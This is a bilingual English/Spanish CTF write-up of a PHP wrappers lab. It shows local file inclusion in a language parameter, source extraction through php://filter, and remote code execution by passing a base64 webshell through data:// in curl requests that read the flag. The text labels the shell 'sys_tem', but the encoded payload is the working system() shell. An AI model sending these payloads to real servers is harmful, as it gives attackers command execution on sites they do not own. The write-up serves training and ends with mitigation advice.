# PHP Wrappers - Lab Writeup

## [¤] Operation Log (Proof of Concept)

```yaml
Target Host: target.ctf
System/OS: Linux
Objective: Find the Flag (Retrieve the hidden flag in the root directory)
Vulnerability: PHP Wrappers (LFI to RCE via data:// wrapper)
```

---

### 1. Reconnaissance & Foothold
- **Vulnerability Identification**:
  We observed that the parameter `language` in `index.php` was vulnerable to Local File Inclusion (LFI). To audit the backend logic and verify the inclusion capability without executing code, we extracted the code using the filter wrapper:
  ```http
  GET /index.php?language=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
  ```
  - **Backend Code Structure**:
    After base64-decoding the retrieved response, we confirmed the following direct file inclusion pattern (without sanitization):
    ```php
    // $lang = $_GET['language'];
    // include($lang);
    ```
    ✔️ **Resultado**: Se identificó que el parámetro vulnerable `language` se pasa directamente a una función de inclusión, permitiendo la carga arbitraria de recursos.

---

### 2. Exploitation (Remote Code Execution)
- **Webshell Payload Preparation**:
  Con la directiva `allow_url_include` habilitada, se diseñó un webshell minimalista estructurado para recibir comandos del sistema operativo a través de una variable adicional llamada `cmd`:
  ```php
  // Webshell PHP: <?php sys_tem($_GET["cmd"]); ?> (nota: sys_tem)
  ```
  Para evitar problemas de codificación y caracteres especiales en la URL, el webshell se convirtió a Base64. (Representado de forma segura como: `PD9waHAgc3lzdGVt...`):

- **Command Execution via `data://`**:
  Invocamos el comando de verificación `id` pasando el payload de forma segura al wrapper:
  ```bash
  # Inyección mediante data:// wrapper
  curl -s "http://target.ctf/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id"
  ```
  ✔️ **Resultado**: El comando se ejecutó exitosamente en el servidor, devolviendo el identificador del usuario de la aplicación web: `uid=33(www-data)`.

---

### 3. Post-Mortem & Flag
- **Locating the Flag**:
  Para listar el contenido del directorio raíz, enviamos el comando `ls -l /` aprovechando el webshell:
  ```bash
  curl -s "http://target.ctf/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%20-l%20/"
  ```
  ✔️ **Resultado**: Se encontró un archivo sospechoso ubicado en la raíz del sistema con el nombre `37809e2f8952f06139011994726d9ef1.txt`.

- **Retrieving the Flag**:
  Utilizamos la utilidad `cat` para volcar el contenido del archivo de la bandera:
  ```bash
  curl -s "http://target.ctf/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt"
  ```
  ✔️ **Resultado**: La ejecución del comando expuso la flag del reto en la respuesta del servidor.

- **Lessons Learned**:
  - Habilitar `allow_url_include` en la configuración de PHP permite que vulnerabilidades de inclusión local (LFI) escalen directamente a RCE usando wrappers de datos o entrada directa (`data://` o `php://input`).
  - La mitigación efectiva consiste en deshabilitar `allow_url_include` en `php.ini` y evitar el paso de variables de usuario directamente a funciones de inclusión.
